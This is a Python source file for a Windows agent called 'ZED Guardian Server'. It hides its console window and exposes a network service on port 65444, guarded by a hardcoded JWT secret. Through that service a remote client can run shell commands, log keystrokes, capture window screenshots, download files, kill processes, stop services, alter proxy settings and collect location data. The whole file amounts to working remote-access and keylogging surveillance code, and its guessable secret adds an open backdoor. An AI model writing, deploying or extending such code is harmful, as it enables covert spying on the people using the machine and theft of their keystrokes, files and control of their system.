from __future__ import annotations

import ctypes
import json
import logging
import os
import socket
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path

import httpx
import jwt
import psutil
import pyautogui
import win32con
import win32gui
from pynput import keyboard

# Shared secret for JWT
SHARED_SECRET = "r00tmeKey"
SSH_HOST_KEY = "ssh_key"
# Server constants
HOST = "0.0.0.0"
PORT = 65444
# SSH server port
SSH_PORT = 2222

DEFAULT_PATH = r"C:\Program Files\ZEDGuardian"
LOG_DIR = os.path.join(DEFAULT_PATH, "logs")
COMMAND_OUTPUT_LOG = os.path.join(LOG_DIR, "command_output.log")


ctypes.windll.user32.ShowWindow(
    ctypes.windll.kernel32.GetConsoleWindow(), win32con.SW_HIDE
)

try:
    os.makedirs(LOG_DIR, exist_ok=True)
    Path(COMMAND_OUTPUT_LOG).touch(exist_ok=True)
except PermissionError:
    # print(f"Permission denied: Unable to create directory or file at {COMMAND_OUTPUT_LOG}.")
    exit(1)
except IOError as e:
    # print(f"Unexpected error: {e}")
    exit(1)


# Utility function for standardized responses
def create_response(success: bool, message: str, data=None) -> dict:
    return {"success": success, "message": message, "data": data}


def verify_token(token: str) -> bool:
    """Verify token and return the user data"""
    try:
        jwt.decode(token, SHARED_SECRET, algorithms=["HS256"])
        return True
    except jwt.ExpiredSignatureError:
        Logger.log("error", "JWT expired.")
        return False
    except jwt.InvalidTokenError:
        Logger.log("error", "Invalid JWT.")
        return False


class SystemInfoManager:
    """
    Manages system-related information such as MAC address and location.
    """

    def __init__(self):
        pass

    @staticmethod
    def get_mac_address():
        """
        Retrieves the MAC address of the active network interface.
        """
        try:
            interfaces = psutil.net_if_addrs()
            for interface, addresses in interfaces.items():
                for addr in addresses:
                    if addr.family == psutil.AF_LINK:
                        return (
                            addr.address
                        )  # Return the first MAC address found
            return "Unknown MAC Address"
        except Exception as e:
            Logger.log("error", f"Error retrieving MAC address: {e}")
            return "Error"

    @staticmethod
    def get_location():
        """
        Retrieves the location information using an IP geolocation API.
        """
        try:
            response = httpx.get("http://ip-api.com/json/")
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    location = {
                        "country": data.get("country"),
                        "city": data.get("city"),
                        "zipcode": data.get("zip"),
                        "isp": data.get("isp"),
                    }
                    Logger.log("info", f"Location data retrieved: {location}")
                    return location
            return {"error": "Failed to retrieve location"}
        except Exception as e:
            Logger.log("error", f"Error retrieving location: {e}")
            return {"error": str(e)}


class Logger:
    """Class for logging and managing server operations."""

    def __init__(self):
        pass

    LOG_FILE = os.path.join(DEFAULT_PATH, "logs", "server.log")

    @staticmethod
    def setup_logger():
        """Setup logger"""
        # Create the directory if it doesn't exist
        log_dir = os.path.dirname(Logger.LOG_FILE)
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)

        logging.basicConfig(
            filename=Logger.LOG_FILE,
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
        )
        logging.info("Logger initialized.")

    @staticmethod
    def log(level, message):
        levels = {
            "debug": logging.debug,
            "info": logging.info,
            "warning": logging.warning,
            "error": logging.error,
        }
        levels.get(level, logging.info)(message)

    @staticmethod
    def set_log_level(level):
        """Set log level"""
        level_map = {
            "debug": logging.DEBUG,
            "info": logging.INFO,
            "warning": logging.WARNING,
            "error": logging.ERROR,
        }
        log_level = level_map.get(level.lower(), logging.INFO)
        logging.getLogger().setLevel(log_level)
        Logger.log("info", f"Log level set to {level.upper()}.")
        return create_response(
            True, f"Sever {level.upper()} level set successfully.", log_level
        )

    @staticmethod
    def get_logs():
        """Get logs"""
        try:
            with open(Logger.LOG_FILE, "r") as log_file:
                logs = log_file.read()
            return create_response(True, "Logs retrieved successfully.", logs)
        except Exception as e:
            Logger.log("error", f"Failed to retrieve logs: {e}")
            return create_response(False, f"Error retrieving logs: {e}")

    @staticmethod
    def clear_logs():
        """Clear logs"""
        try:
            with open(Logger.LOG_FILE, "w") as log_file:
                log_file.truncate(0)
            Logger.log("info", "Logs cleared successfully.")
            return create_response(True, "Logs cleared successfully.")
        except Exception as e:
            Logger.log("error", f"Failed to clear logs: {e}")
            return create_response(False, f"Error clearing logs: {e}")


class ProcessManager:
    """Class for managing process operations."""

    def __init__(self):
        pass

    @staticmethod
    def get_processes() -> dict:
        """Get processes"""
        try:
            processes = [
                proc.info
                for proc in psutil.process_iter(
                    attrs=["pid", "name", "username"]
                )
            ]
            Logger.log("info", "Fetched process list.")
            return create_response(
                True, "Processes fetched successfully.", processes
            )
        except Exception as e:
            Logger.log("error", f"Error fetching processes: {e}")
            return create_response(False, f"Error fetching processes: {e}")

    @staticmethod
    def kill_process(pid: int) -> dict:
        "Kill process by PID"
        try:
            psutil.Process(pid).terminate()
            Logger.log("info", f"Terminated process {pid}.")
            return create_response(
                True, f"Process {pid} terminated successfully."
            )
        except Exception as e:
            Logger.log("error", f"Error terminating process {pid}: {e}")
            return create_response(
                False, f"Error terminating process {pid}: {e}"
            )


class ServiceManager:
    """Class for managing service operations."""

    def __init__(self):
        pass

    @staticmethod
    def get_services() -> dict:
        """Get services"""
        try:
            services = [
                {
                    "name": service.name(),
                    "status": service.status(),
                    "display_name": service.display_name(),
                }
                for service in psutil.win_service_iter()
            ]
            Logger.log("info", "Fetched service list.")
            return create_response(
                True, "Services fetched successfully.", services
            )
        except Exception as e:
            Logger.log("error", f"Error fetching services: {e}")
            return create_response(False, f"Error fetching services: {e}")

    @staticmethod
    def stop_service(service_name: str) -> dict:
        """Stop service"""
        try:
            result = subprocess.run(
                ["sc", "stop", service_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if result.returncode == 0:
                Logger.log("info", f"Stopped service: {service_name}")
                return create_response(
                    True, f"Service '{service_name}' stopped successfully."
                )
            else:
                Logger.log(
                    "error",
                    f"Failed to stop service: {service_name}. {result.stderr}",
                )
                return create_response(False, result.stdout)
        except Exception as e:
            Logger.log(
                "error", f"Error stopping service '{service_name}': {e}"
            )
            return create_response(
                False, f"Error stopping service '{service_name}': {e}"
            )


class NetworkManager:
    """Class for managing network operations."""

    def __init__(self):
        pass

    is_blocked = False  # Tracks whether the internet is currently blocked

    @staticmethod
    def set_proxy(proxy_address: str) -> None:
        """
        Sets the system-wide proxy.
        """
        try:
            # Enable proxy and set the proxy server address
            subprocess.run(
                [
                    "reg",
                    "add",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                    "/v",
                    "ProxyEnable",
                    "/t",
                    "REG_DWORD",
                    "/d",
                    "1",
                    "/f",
                ],
                check=True,
            )
            subprocess.run(
                [
                    "reg",
                    "add",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                    "/v",
                    "ProxyServer",
                    "/t",
                    "REG_SZ",
                    "/d",
                    proxy_address,
                    "/f",
                ],
                check=True,
            )
            # Notify the system of proxy changes
            subprocess.run(
                ["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"]
            )
            Logger.log("info", f"Proxy set to {proxy_address}")
        except subprocess.CalledProcessError as e:
            Logger.log("error", f"Failed to set proxy: {e}")

    @staticmethod
    def reset_proxy() -> None:
        """
        Resets the system-wide proxy to default (disabled).
        """
        try:
            # Disable proxy
            subprocess.run(
                [
                    "reg",
                    "add",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                    "/v",
                    "ProxyEnable",
                    "/t",
                    "REG_DWORD",
                    "/d",
                    "0",
                    "/f",
                ],
                check=True,
            )
            # Notify the system of proxy changes
            subprocess.run(
                ["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"]
            )
            Logger.log("info", "Proxy reset to default")
        except subprocess.CalledProcessError as e:
            Logger.log("error", f"Failed to reset proxy: {e}")

    @staticmethod
    def check_internet() -> dict:
        """
        Checks internet connectivity by pinging a well-known server.
        Returns True if the internet is accessible, otherwise False.
        """
        try:
            subprocess.run(
                ["ping", "-n", "1", "google.com"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True,
            )
            Logger.log("info", "Internet is still accessible.")
            return create_response(True, "Internet is still accessible.")
        except subprocess.CalledProcessError:
            Logger.log("info", "Internet is confirmed to be blocked.")
            return create_response(
                False, "Internet is confirmed to be blocked."
            )

    @staticmethod
    def block_internet():
        """
        Blocks internet by setting a system-wide proxy to a non-existent address.
        """
        if NetworkManager.is_blocked:
            Logger.log(
                "debug",
                "Internet is already blocked. Skipping redundant block.",
            )
            return

        try:
            NetworkManager.set_proxy("127.0.0.1:9999")
            NetworkManager.is_blocked = True
            Logger.log("info", "Internet block settings applied successfully.")
        except Exception as e:
            Logger.log("error", f"Error blocking internet: {e}")

    @staticmethod
    def unblock_internet() -> None:
        """
        Unblocks internet by resetting the system-wide proxy settings.
        """
        if not NetworkManager.is_blocked:
            Logger.log(
                "debug",
                "Internet is already unblocked. Skipping redundant unblock.",
            )
            return

        try:
            NetworkManager.reset_proxy()
            NetworkManager.is_blocked = False
            Logger.log("info", "Internet unblocked successfully.")
        except Exception as e:
            Logger.log("error", f"Error unblocking internet: {e}")


class SchedulerManager:
    """Class for managing schedule operations."""

    def __init__(self):
        pass

    schedule = []  # Stores schedules
    current_state = None  # Tracks if internet is blocked or unblocked ("blocked" or "unblocked")

    @staticmethod
    def add_schedule(
        schedule_type: str, date_or_day: str, start_time: str, end_time: str
    ) -> dict:
        """
        Adds a schedule with specific details (type, date_or_day, start, end) and evaluates whether to block/unblock.
        """
        try:
            new_entry = {
                "type": schedule_type,  # "Recurring" or "Specific"
                "date_or_day": date_or_day,  # e.g., "Monday" or "2024-01-01"
                "start": start_time,  # e.g., "08:00"
                "end": end_time,  # e.g., "10:00"
            }
            SchedulerManager.schedule.append(new_entry)
            Logger.log("info", f"Added schedule: {new_entry}")

            # Reevaluate the schedule immediately
            SchedulerManager.evaluate_schedule()

            return create_response(
                True, "Schedule added successfully.", SchedulerManager.schedule
            )
        except Exception as e:
            Logger.log("error", f"Error adding schedule: {e}")
            return create_response(False, f"Error adding schedule: {e}")

    @staticmethod
    def remove_schedule(index: int) -> dict:
        """
        Removes a schedule by index and reevaluates.
        """
        try:
            removed = SchedulerManager.schedule.pop(index)
            Logger.log("info", f"Removed schedule: {removed}")

            # Reevaluate schedule immediately
            SchedulerManager.evaluate_schedule()

            return create_response(
                True,
                "Schedule removed successfully.",
                SchedulerManager.schedule,
            )
        except IndexError:
            Logger.log("warning", f"Invalid schedule index: {index}")
            return create_response(False, "Invalid schedule index.")

    @staticmethod
    def list_schedules() -> dict:
        """
        Lists all current schedules, including type, date_or_day, start, and end.
        """
        try:
            return create_response(
                True,
                "Schedules retrieved successfully.",
                SchedulerManager.schedule,
            )
        except Exception as e:
            Logger.log("error", f"Error listing schedules: {e}")
            return create_response(False, f"Error listing schedules: {e}")

    @staticmethod
    def evaluate_schedule() -> None:
        """
        Evaluates the current time and day against all schedules and blocks/unblocks the internet accordingly.
        """
        now = datetime.now()
        current_time = now.time()
        current_day = now.strftime("%A")  # Day of the week
        current_date = now.strftime("%Y-%m-%d")  # Today's date

        should_block = False

        for entry in SchedulerManager.schedule:
            start_time = datetime.strptime(entry["start"], "%H:%M").time()
            end_time = datetime.strptime(entry["end"], "%H:%M").time()

            if entry["type"] == "Recurring":
                # Match based on recurring days
                if (
                    entry["date_or_day"] in ("All", current_day)
                    and start_time <= current_time <= end_time
                ):
                    should_block = True
                    break
            elif entry["type"] == "Specific":
                # Match based on specific date
                if (
                    entry["date_or_day"] == current_date
                    and start_time <= current_time <= end_time
                ):
                    should_block = True
                    break

        # Block or unblock internet based on evaluation
        if should_block and SchedulerManager.current_state != "blocked":
            NetworkManager.block_internet()
            SchedulerManager.current_state = "blocked"
        elif (
            not should_block and SchedulerManager.current_state != "unblocked"
        ):
            NetworkManager.unblock_internet()
            SchedulerManager.current_state = "unblocked"

    @staticmethod
    def apply_schedule() -> None:
        """
        Continuously applies internet restrictions based on the schedule.
        """
        Logger.log("info", "Scheduler started.")
        while True:
            SchedulerManager.evaluate_schedule()
            time.sleep(5)  # Check every 5 seconds


class ScreenshotManager:
    """Class for handling screenshot operations."""

    def __init__(self):
        pass

    @staticmethod
    def list_windows() -> dict:
        """Fetches a list of open windows."""
        windows = []

        def enum_windows_proc(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:  # Only include windows with a title
                    windows.append({"title": title, "id": hwnd})

        win32gui.EnumWindows(enum_windows_proc, None)
        return create_response(True, "Windows fetched successfully.", windows)

    @staticmethod
    def capture_window(window_id) -> dict:
        """Takes a screenshot of the specified window."""
        try:
            # Focus the target window
            win32gui.ShowWindow(
                window_id, win32con.SW_RESTORE
            )  # Restore the window if minimized
            win32gui.SetForegroundWindow(window_id)
            time.sleep(0.5)  # Give the window time to activate

            # Get the window rectangle
            rect = win32gui.GetWindowRect(window_id)
            x, y, x1, y1 = rect

            # Take a screenshot of the screen and crop to the window
            screenshot = pyautogui.screenshot()
            cropped = screenshot.crop((x, y, x1, y1))

            # Save the screenshot
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            window_title = (
                win32gui.GetWindowText(window_id)
                .replace(" ", "_")
                .replace(":", "-")
            )
            filename = f"{window_title}-{timestamp}.png"
            file_path = os.path.join(os.getcwd(), filename)
            cropped.save(file_path)

            return create_response(
                True,
                "Screenshot captured successfully.",
                {"file_path": file_path, "filename": filename},
            )
        except Exception as e:
            return create_response(False, f"Error capturing screenshot: {e}")


class FileManager:
    """Class to manage file-related operations."""

    def __init__(self):
        pass

    @staticmethod
    def list_files(directory: str) -> dict:
        """Lists all files in the specified directory."""
        try:
            files = [
                {
                    "name": f,
                    "type": (
                        "directory"
                        if os.path.isdir(os.path.join(directory, f))
                        else "file"
                    ),
                }
                for f in os.listdir(directory)
            ]
            return create_response(True, "Files listed successfully.", files)
        except Exception as e:
            return create_response(False, f"Error listing files: {e}")

    @staticmethod
    def download_file(file_path: str) -> dict:
        """Downloads a file from the server."""
        try:
            if not os.path.isfile(file_path):
                return create_response(False, "File does not exist.")
            with open(file_path, "rb") as f:
                file_data = f.read()
            return create_response(
                True,
                "File downloaded successfully.",
                {
                    "file_name": os.path.basename(file_path),
                    "file_data": file_data.hex(),
                },
            )
        except Exception as e:
            return create_response(False, f"Error downloading file: {e}")


class ConsoleManager:
    """
    Handles persistent execution of shell commands with an interactive cmd.exe session.
    """

    def __init__(self):
        pass

    process = None
    lock = threading.Lock()

    @staticmethod
    def write_to_command_log(raw_output: str) -> None:
        """
        Appends the raw output from the cmd.exe session to the log file immediately.
        """
        try:
            if not COMMAND_OUTPUT_LOG or not os.path.exists(
                COMMAND_OUTPUT_LOG
            ):
                raise ValueError(
                    "Command output log path is not initialized or does not exist."
                )

            with open(COMMAND_OUTPUT_LOG, "a", encoding="utf-8") as log_file:
                log_file.write(raw_output)
                log_file.flush()  # Ensure immediate write
        except Exception as e:
            Logger.log("error", f"Error writing to command log: {e}")

    @staticmethod
    def ensure_shell() -> None:
        """
        Ensures that the interactive cmd.exe process is running and captures the initial output.
        """
        try:
            if (
                ConsoleManager.process is None
                or ConsoleManager.process.poll() is not None
            ):
                ConsoleManager.process = subprocess.Popen(
                    "cmd.exe",
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    start_new_session=True,
                    bufsize=1,
                )
                Logger.log("info", "Interactive cmd.exe shell started.")

                # Capture initial output (e.g., Microsoft Windows version banner)
                initial_output = ""
                while True:
                    line = ConsoleManager.process.stdout.readline()
                    if (
                        not line.strip()
                    ):  # Stop reading on the first empty line
                        break
                    initial_output += line
                    ConsoleManager.write_to_command_log(line)  # Log each line

                Logger.log(
                    "info",
                    f"Initial cmd.exe output captured: {initial_output.strip()}",
                )

        except Exception as e:
            Logger.log("error", f"Failed to start or ensure shell: {e}")

    @staticmethod
    def execute_command(command: str) -> dict:
        """
        Executes a command in the persistent shell and writes the raw output to the log file immediately.
        """
        ConsoleManager.ensure_shell()  # Ensure the shell is running
        Logger.log("info", f"Executing command: {command}")

        try:
            with ConsoleManager.lock:  # Prevent concurrent access to the shell
                # Send the command to the shell
                ConsoleManager.process.stdin.write(command + "\n")
                ConsoleManager.process.stdin.flush()

                # Capture the output line-by-line and write it immediately
                raw_output = ""
                while True:
                    line = ConsoleManager.process.stdout.readline()
                    if not line.strip():  # Stop on an empty line
                        break
                    raw_output += line
                    ConsoleManager.write_to_command_log(
                        line
                    )  # Write each line to the log immediately

                Logger.log("info", "Command executed successfully.")
                return create_response(
                    True,
                    "Command executed successfully.",
                    {"output": raw_output.strip()},
                )

        except Exception as e:
            Logger.log("error", f"Error executing command: {e}")
            return create_response(False, f"Error executing command: {e}")

    @staticmethod
    def stop_shell() -> dict:
        """
        Stops the persistent shell process.
        """
        try:
            if (
                ConsoleManager.process
                and ConsoleManager.process.poll() is None
            ):
                ConsoleManager.process.terminate()
                ConsoleManager.process = None
                Logger.log("info", "Interactive cmd.exe shell stopped.")
                return create_response(True, "Shell terminated successfully.")
            else:
                Logger.log(
                    "warning",
                    "Attempted to stop shell, but it was not running.",
                )
                return create_response(False, "Shell is not running.")
        except Exception as e:
            Logger.log("error", f"Error stopping shell: {e}")
            return create_response(False, f"Error stopping shell: {e}")


class KeyloggerManager:
    """Class for handling keylogging operations."""

    def __init__(self):
        pass

    key_logs = []  # List of log entries
    is_logging = False
    _listener_thread = None

    @staticmethod
    def start_keylogger() -> dict:
        """Starts the keylogger in a separate thread."""
        if KeyloggerManager.is_logging:
            return create_response(False, "Keylogger is already running.")

        KeyloggerManager.is_logging = True
        KeyloggerManager._listener_thread = threading.Thread(
            target=KeyloggerManager._run_keylogger, daemon=True
        )
        KeyloggerManager._listener_thread.start()
        return create_response(True, "Keylogger started successfully.")

    @staticmethod
    def stop_keylogger() -> dict:
        """Stops the keylogger and clears the logs."""
        if not KeyloggerManager.is_logging:
            return create_response(False, "Keylogger is not running.")

        KeyloggerManager.is_logging = False
        KeyloggerManager.key_logs.clear()  # Clear the logs
        return create_response(True, "Keylogger stopped and logs cleared.")

    @staticmethod
    def get_logs() -> dict:
        """Fetches the collected key logs."""
        formatted_logs = "".join(KeyloggerManager.key_logs)
        return create_response(
            True, "Key logs fetched successfully.", formatted_logs
        )

    @staticmethod
    def _run_keylogger() -> None:
        """Internal method to capture keypresses."""
        with keyboard.Listener(
            on_press=KeyloggerManager._on_key_press
        ) as listener:
            listener.join()

    @staticmethod
    def _on_key_press(key: keyboard.Key) -> None | bool:
        """Handles key press events and formats logs."""
        if not KeyloggerManager.is_logging:
            return False

        try:
            if hasattr(key, "char") and key.char is not None:
                KeyloggerManager.key_logs.append(key.char)  # Normal key
            else:
                # Special key (e.g., Key.space)
                special_key = str(key).replace("Key.", "").capitalize()
                if special_key == "Space":
                    KeyloggerManager.key_logs.append(" ")
                elif special_key == "Enter":
                    KeyloggerManager.key_logs.append("\n")
                else:
                    KeyloggerManager.key_logs.append(f"[{special_key}]")
        except Exception as e:
            KeyloggerManager.key_logs.append(f"[Error: {e}]")


COMMAND_HANDLERS = {
    "get_processes": lambda payload=None: ProcessManager.get_processes(),
    "kill_process": lambda payload: ProcessManager.kill_process(
        payload["pid"]
    ),
    "get_services": lambda payload=None: ServiceManager.get_services(),
    "stop_service": lambda payload: ServiceManager.stop_service(
        payload["service_name"]
    ),
    "block_internet": lambda payload=None: NetworkManager.block_internet(),
    "unblock_internet": lambda payload=None: NetworkManager.unblock_internet(),
    "add_schedule": lambda payload: SchedulerManager.add_schedule(
        payload["schedule_type"],
        payload["date_or_day"],
        payload["start_time"],
        payload["end_time"],
    ),
    "execute_command": lambda payload: ConsoleManager.execute_command(
        payload.get("command")
    ),
    "remove_schedule": lambda payload: SchedulerManager.remove_schedule(
        payload["index"]
    ),
    "list_schedules": lambda payload=None: SchedulerManager.list_schedules(),
    "list_windows": lambda payload=None: ScreenshotManager.list_windows(),
    "capture_window": lambda payload: ScreenshotManager.capture_window(
        payload["window_id"]
    ),
    "start_keylogger": lambda payload=None: KeyloggerManager.start_keylogger(),
    "get_keylogs": lambda payload=None: KeyloggerManager.get_logs(),
    "check_connection": lambda payload=None: "Connected",
    "stop_keylogger": lambda payload=None: KeyloggerManager.stop_keylogger(),
    "check_internet": lambda payload=None: NetworkManager.check_internet(),
    "get_logs": lambda payload=None: Logger.get_logs(),
    "clear_logs": lambda payload=None: Logger.clear_logs(),
    "get_system_info": lambda payload=None: create_response(
        True,
        "System information retrieved successfully.",
        {
            "mac_address": SystemInfoManager.get_mac_address(),
            "location": SystemInfoManager.get_location(),
        },
    ),
    "set_log_level": lambda payload: Logger.set_log_level(
        payload.get("level")
    ),
    "list_files": lambda payload: FileManager.list_files(
        payload.get("directory", ".")
    ),
    "download_file": lambda payload: FileManager.download_file(
        payload.get("file_path")
    ),
}


def send_response(conn: socket.socket, response: dict) -> None:
    try:
        response_str = json.dumps(response)
        length_prefix = f"{len(response_str):<10}"
        conn.sendall(
            length_prefix.encode("utf-8") + response_str.encode("utf-8")
        )
        conn.shutdown(socket.SHUT_WR)
    except Exception as e:
        Logger.log("error", f"Error sending response: {e}")
    finally:
        conn.close()  # Ensure socket is always closed


def handle_client(conn: socket.socket) -> None:
    """
    Handles client requests, processes commands, and sends responses.
    """
    try:
        while True:

            data = conn.recv(1024).decode("utf-8")
            conn.settimeout(2)
            if not data:
                break

            try:

                payload = json.loads(data)
                token = payload.get("token")

                if not verify_token(token):
                    send_response(
                        conn,
                        create_response(False, "Invalid or expired token."),
                    )
                    continue

                command = payload.get("request")
                handler = COMMAND_HANDLERS.get(command)

                if handler:
                    response = handler(payload)
                else:
                    response = create_response(False, "Unknown request.")

                send_response(conn, response)

            except json.JSONDecodeError:
                send_response(
                    conn, create_response(False, "Invalid JSON format.")
                )
            except Exception as e:
                Logger.log(
                    "error",
                    f"Error processing command: {e}",
                )
                send_response(
                    conn,
                    create_response(False, f"Error processing command: {e}"),
                )

    except Exception as e:
        Logger.log("error", f"Error handling client: {e}")
    finally:
        conn.close()


def start_server():
    """Starts the server and listens for connections."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        # print(f"ZED Guardian Server v0.1 running on {HOST}:{PORT}")

        while True:
            conn, addr = server_socket.accept()
            threading.Thread(target=handle_client, args=(conn,)).start()


if __name__ == "__main__":
    Logger.setup_logger()
    Logger.log("info", "ZED Guardian Server started.")

    # Start the network scheduler in a separate thread
    threading.Thread(
        target=SchedulerManager.apply_schedule, daemon=True
    ).start()
    start_server()
